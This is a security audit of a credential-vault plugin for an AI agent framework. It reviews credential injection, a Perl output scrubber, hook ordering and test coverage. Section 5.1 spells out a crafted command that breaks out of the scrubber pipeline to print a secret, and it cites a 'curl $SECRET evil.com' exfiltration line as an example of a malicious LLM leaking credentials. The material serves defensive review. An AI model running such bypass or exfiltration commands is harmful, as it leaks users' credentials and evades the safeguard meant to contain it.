# Security Audit — Final (2026-03-12)

> **Audit date:** 2026-03-12 18:05 UTC
> **Auditor:** MillieClaw (agentic security review)
> **Scope:** Full source code, injection path, scrubbing pipeline, test suite, docs accuracy
> **Commit:** `10a611f` on `main`
> **Context:** Post-remediation audit after params.env + Perl scrubber implementation

---

## Executive Summary

The OpenClaw Credential Vault plugin has undergone significant security improvements since the last audit. The two most critical findings from the prior audit (F-1: process.env contamination, F-9: LLM receives unscrubbed output) have been effectively addressed. The codebase is well-structured with defense-in-depth scrubbing across 5 hook points.

**Overall Risk Rating: LOW-MEDIUM**

The remaining risks are inherent to the architecture (pattern-based scrubbing limitations, fail-open design) rather than implementation bugs. No critical or high-severity vulnerabilities were found.

---

## 1. Injection Path Review (`handleBeforeToolCall`)

### 1.1 params.env Isolation — VERIFIED ✅

Credentials are injected exclusively via `params.env`, which is passed directly to the subprocess spawn. Confirmed by:
- `grep -n 'process\.env\[' src/index.ts` returns **zero matches** — no process.env mutation
- The `injectedEnvVars` array is declared but never populated (dead code, harmless)
- `handleAfterToolCall` cleanup comment confirms: "process.env cleanup removed — we no longer set process.env during injection"

**Verdict:** F-1 is fully resolved. The gateway process environment is never contaminated with credentials.

### 1.2 Perl Stdout Scrubber — VERIFIED ✅ with caveats

The scrubber construction (lines 524-533 of `index.ts`):

```typescript
const b64Value = Buffer.from(resolved).toString("base64");
// ...
const perlBegin = scrubPairs
  .map((p, i) => `use MIME::Base64; $s${i}=decode_base64("${p.b64Value}"); $r${i}="${p.replacement}";`)
  .join(" ");
const perlSubs = scrubPairs
  .map((_, i) => `s/\\Q$s${i}\\E/$r${i}/g`)
  .join("; ");
params.command = `set -o pipefail; { ${params.command} ; } 2>&1 | perl -pe '${perlScript}'`;
```

**Security analysis:**

- **Base64 encoding is correct.** `Buffer.from().toString("base64")` produces only `[A-Za-z0-9+/=]` characters. These are safe inside Perl double-quoted strings (no `$`, `@`, `\` — no interpolation risk).
- **Replacement string is safe.** `[VAULT:${vaultToolName}]` — tool names are validated to `^[a-zA-Z0-9][a-zA-Z0-9._-]*$` (max 64 chars). No Perl metacharacters possible.
- **Single-quote wrapping is correct.** The entire Perl script is wrapped in bash single quotes. Neither base64 output nor validated tool names can contain single quotes.
- **`\Q...\E` quoting in Perl is correct.** This escapes all regex metacharacters in the credential, preventing regex injection via credential content.
- **`set -o pipefail` preserves exit codes.** Tests confirm exit codes 0, 1, and 42 are correctly preserved.

### 1.3 Edge Cases

| Edge Case | Behavior | Severity |
|-----------|----------|----------|
| **Empty credential** | `addLiteralCredential` rejects < 4 chars, BUT the Perl scrubber is built from `scrubPairs` BEFORE that check. An empty/short credential would create `s/\Q\E//g` which matches empty string at every position, corrupting all output. | **Medium** — NEW |
| **Credential with newlines** | Base64 handles correctly. However, `perl -pe` processes line-by-line, so `\Q...\E` with embedded newlines won't match across line boundaries. Credential leaks partially on each line. | **Low** — documented limitation |
| **Very long credentials** | Base64 increases length ~33%. Could exceed ARG_MAX (~2MB on Linux). Extremely unlikely in practice. | **Informational** |
| **Credential containing NUL bytes** | Base64 handles NUL. Perl `\Q...\E` handles NUL. Unlikely in real credentials. | **Informational** |

### 1.4 No Plaintext in Command String — VERIFIED ✅

The wrapped command string contains only the base64-encoded credential, never plaintext. Test `perl-scrubber.test.ts` "should not contain raw credential in wrapped command" confirms this for both single and multi-credential scenarios.

---

## 2. Hook Review

### 2.1 `handleBeforeToolCall` (priority 10) — ✅ CORRECT

- Injects credentials via `params.env` only
- Wraps exec commands with Perl scrubber
- Scrubs write/edit tool content via `scrubWriteEditContent()`
- Handles browser password resolution with domain pinning
- Handles browser cookie injection on navigate
- Wrapped in try-catch, fails open (returns void)

### 2.2 `handleAfterToolCall` (priority 1) — ✅ CORRECT

- Observe-only: logs credential access events to audit log
- Clears `currentInjections` tracking array
- No result modification (correct — after_tool_call is observe-only)
- Comment correctly notes process.env cleanup is no longer needed

### 2.3 `handleToolResultPersist` (priority 1) — ✅ CORRECT

- Injects pending resolver warnings into result content
- Deep-scrubs message via `scrubObject()` (regex + literal + env-var patterns)
- Additional literal credential scrub on text content fields
- Handles both string and array content formats
- Fails open on error

### 2.4 `handleBeforeMessageWrite` (priority 1) — ✅ CORRECT

- Scrubs all messages before transcript write
- Uses `scrubTextWithTracking()` for audit logging
- Additional literal credential scrub pass
- Handles both string and array content formats
- Logs scrub events to audit log

### 2.5 `handleMessageSending` (priority 1) — ✅ CORRECT

- Final scrub before outbound delivery
- Regex + literal scrub
- Returns `{content}` only when changed (correct per hook contract)
- Fails open on error

### 2.6 Hook Priority Design — ✅ CORRECT

- Injection at priority 10 (runs LAST) — other plugins see pre-injection params
- Scrubbing at priority 1 (runs FIRST) — other plugins see scrubbed results
- This is the correct ordering for both security goals

---

## 3. Test Coverage

### 3.1 Test Results

- **30 test files, 607 tests total**
- **603 passing, 4 failing**
- All 4 failures are **performance tests** (1MB scrubbing threshold: 10ms target vs 12-21ms actual)
- Performance failures are environment-dependent, not security bugs

### 3.2 Security-Critical Test Coverage

| Area | Tests | Assessment |
|------|-------|------------|
| Perl scrubber (basic, exfil, exit codes, edge cases, multi-cred) | 23 | **Excellent** |
| Adversarial attack vectors (7 categories) | 54 | **Excellent** |
| Browser domain pinning | 56 + 18 | **Excellent** |
| Literal credential scrubbing | 12 | **Good** |
| Write/edit interception | 13 | **Good** |
| False positive prevention | 37 | **Good** |
| Env var scrubbing | 26 | **Good** |
| Sub-agent isolation | 8 | **Adequate** |
| Compaction scrubbing | 12 | **Good** |
| Crypto round-trip | 19 | **Excellent** |

### 3.3 Untested Security-Critical Paths

1. ~~**PTY mode (`pty: true`) with Perl scrubber**~~ — RESOLVED: 3 PTY tests added (commit 9889ce5), all pass. Pipe sits outside PTY boundary.
2. **Empty/short credential in Perl scrubber** — The `addLiteralCredential` 4-char minimum doesn't protect the Perl construction path.
3. **Group breakout via crafted command** — No test for commands containing `; }` that break out of the `{ ... }` grouping (see §5.1).
4. **SIGUSR2 hot-reload behavior** — Not tested.
5. **Fail-open error paths in hooks** — No test verifies that a scrubbing exception results in pass-through rather than crash.

---

## 4. Documentation Accuracy

### 4.1 SECURITY-AUDIT.md

- **F-1 status:** Correctly marked as RESOLVED with commit reference `630c7a5` ✅
- **F-9 status:** Correctly marked as MITIGATED with accurate description of Perl scrubber approach ✅
- **F-1 text has a stale reference** — Lines under "Recommendation" still say "Remove `process.env[envKey] = resolved` (line 393)". This line no longer exists. The recommendation section should be updated to say "RESOLVED — no action needed." **Minor doc inconsistency.**
- **F-8 (shell escaping finding):** References `export prepend` and `envExports` code that no longer exists. The injection path has completely changed. **Stale finding — should be removed or rewritten.**

### 4.2 THREAT-MODEL.md

- **Threat 6 (Environment Variable Exposure):** Correctly describes params.env-only injection and Perl scrubber ✅
- **Path 4 (Environment Dump):** Correctly describes 4-layer defense with Perl scrubber as Layer 0 ✅
- **Defense Layer Matrix:** Accurately reflects current architecture ✅
- **F-9 limitation note in Overview:** Correctly states the limitation and that the Perl scrubber is a mitigation ✅
- **Overall:** Consistent with the actual code ✅

### 4.3 SCRUB-EXPERIMENTS-v5.2.md

- **Findings are still valid.** The experiments correctly identified that all env injection methods expose credentials to subprocess commands, and that transcript scrubbing works but LLM sees raw output.
- **"Next steps" section at bottom** lists exactly what was implemented (params.env only, Perl stdout scrubber). Findings remain historically accurate and informative. ✅

---

## 5. New Vulnerability Analysis

### 5.1 Group Breakout via Crafted Command — LOW-MEDIUM

**Finding:** The Perl scrubber wraps commands as `{ COMMAND ; } 2>&1 | perl -pe '...'`. If the LLM crafts a command containing `; }` (e.g., `echo safe ; } ; printenv SECRET ; { :`), the output from the middle commands bypasses the Perl pipe entirely.

**Analysis:** This is a deliberate exfiltration attack by the LLM. The same LLM could also do `curl $SECRET evil.com` within the subprocess, which is already acknowledged as an unsolved threat class in THREAT-MODEL.md (Threat 1, "What this does NOT cover"). The group breakout is a variant of the same fundamental limitation: the subprocess has the credential in its environment and the LLM controls the command.

**Severity:** LOW-MEDIUM. It's a bypass of the defense-in-depth scrubber, not a bypass of a security boundary. The scrubber was never designed to be a hard boundary against a deliberately malicious LLM.

**Recommendation:** Document this limitation alongside the file-redirect bypass in the threat model. Consider using `bash -c` with proper argument quoting instead of `{ ... }` grouping, though this has its own escaping challenges.

### 5.2 PTY Mode Compatibility — RESOLVED (tested, not an issue)

**Original concern:** When `pty: true` is set on an exec call, the exec tool allocates a pseudo-terminal. The Perl pipe scrubber might not function correctly in PTY context.

**Resolution (commit 9889ce5):** 3 PTY-mode tests added using `script -qc` (which allocates a real PTY). All pass. The Perl scrubber works correctly because the pipe sits *outside* the PTY boundary: `{ script -qc 'command' /dev/null ; } 2>&1 | perl -pe '...'`. PTY output still flows through the perl replacement before exec captures it.

**Severity:** ~~MEDIUM~~ → NOT AN ISSUE. Verified with single-credential, env var exfiltration, and multi-credential PTY tests.

### 5.3 Perl Script Injection via Base64 — NOT VULNERABLE ✅

Base64 output alphabet `[A-Za-z0-9+/=]` contains no Perl metacharacters. The base64 string is placed inside Perl double quotes where only `$`, `@`, `\`, and `"` trigger interpolation. None appear in base64 output. **Safe.**

### 5.4 Perl Script Injection via Tool Name — NOT VULNERABLE ✅

Tool names validated to `^[a-zA-Z0-9][a-zA-Z0-9._-]*$`. The replacement string `[VAULT:toolname]` goes into Perl double quotes. Characters `.`, `-`, `[`, `]`, `:` are all literal in Perl double-quoted strings. **Safe.**

### 5.5 Base64 Encoding Exploits — NOT VULNERABLE ✅

`Buffer.from(credential).toString("base64")` (Node.js) and `decode_base64()` (Perl MIME::Base64) are standard RFC 4648 implementations. They produce identical results. Test `perl-scrubber.test.ts` confirms round-trip correctness for credentials with special characters (`$`, `'`, `"`, `\`, `|`). **Safe.**

### 5.6 Empty Credential in Perl Scrubber — LOW

**Finding:** If a credential resolves to an empty string or string shorter than 4 characters, the `addLiteralCredential` guard rejects it, but the Perl scrubber `scrubPairs` array is populated BEFORE `addLiteralCredential` is called (in `handleBeforeToolCall`, not in `getCredential`). Actually, reviewing more carefully: the `scrubPairs` are built from `resolved` values inside the `rule.env` loop in `handleBeforeToolCall`. The base64 of an empty string is `""`. The Perl `decode_base64("")` returns `""`. Then `s/\Q\E//g` matches the empty string at every position, inserting `[VAULT:name]` between every character.

**Severity:** LOW. Empty credentials would fail authentication anyway, so this scenario is unlikely in practice. But it would corrupt the tool output.

**Recommendation:** Add a guard in the Perl scrubber construction: skip credentials where `resolved.length < 4`.

---

## 6. Prior Findings Status

| Finding | Prior Status | Current Status | Verified |
|---------|-------------|----------------|----------|
| F-1: process.env contamination | Medium | **RESOLVED** — zero `process.env[` mutations | ✅ Code grep confirms |
| F-2: Rust resolver path traversal | Medium | **OPEN** — no change | — |
| F-3: Credential cache no max size | Low | **OPEN** — no change | — |
| F-4: Mocked concurrent tests | Low | **OPEN** — no change | — |
| F-5: Fail-open lacks alerting | Low | **OPEN** — no change | — |
| F-6: SIGUSR2 stale literals | Low/Info | **OPEN** — security-positive | — |
| F-7: Missing global scrub patterns | Info | **OPEN** — no change | — |
| F-8: Shell metacharacter injection | Info | **STALE** — export prepend code removed; finding no longer applies to current architecture | ⚠️ Doc needs update |
| F-9: LLM unscrubbed output | High | **MITIGATED** — Perl stdout scrubber catches primary vectors | ✅ Tests confirm |

---

## 7. Overall Risk Assessment

**Rating: LOW-MEDIUM**

### What's Strong

- **Injection path is clean.** params.env only, no process.env contamination, no plaintext in command strings.
- **Perl scrubber is well-constructed.** Base64 encoding avoids all shell/Perl escaping issues. `\Q...\E` quoting prevents regex injection. `set -o pipefail` preserves exit codes.
- **Multi-layer scrubbing.** 5 hook points with redundant scrubbing. Even if one layer fails, others catch the credential.
- **Test suite is comprehensive.** 603 passing tests covering adversarial attacks, false positives, edge cases, and the new Perl scrubber.
- **Documentation is accurate.** Threat model and security audit docs correctly reflect the current architecture (with minor stale references noted above).

### What's Adequate

- **Defense-in-depth against LLM exfiltration.** The Perl scrubber catches the common vectors (printenv, echo, jq env access) but can be bypassed by deliberate command construction. This is an inherent limitation.
- **Hook priority design.** Correct ordering, but no integration test with actual competing plugins.

### Residual Risks

- ~~**PTY mode is untested with the scrubber** (Medium — §5.2)~~ → RESOLVED, not an issue
- **Group breakout via crafted commands** (Low-Medium — §5.1)
- **Rust resolver path traversal** (Medium — unchanged from prior audit)
- **Fail-open errors are silent in production** (Low — unchanged)
- **Empty credential could corrupt output** (Low — §5.6)

### Recommendations (Priority Order)

1. ~~**Add PTY mode test**~~ → DONE (commit 9889ce5)
2. **Add min-length guard** in Perl scrubber construction (skip credentials < 4 chars)
3. ~~**Update SECURITY-AUDIT.md** — remove stale F-8 finding, update F-1 recommendation text~~ → DONE (commit 80be8c2)
4. **Add Rust resolver tool name validation** (path traversal — carried from prior audit)
5. **Relax performance test thresholds** — 10ms for 1MB is aggressive for CI; consider 25ms

---

*End of audit. The credential vault is in good security posture for its intended use case. The params.env + Perl scrubber architecture is a meaningful improvement over the prior export-prepend approach.*
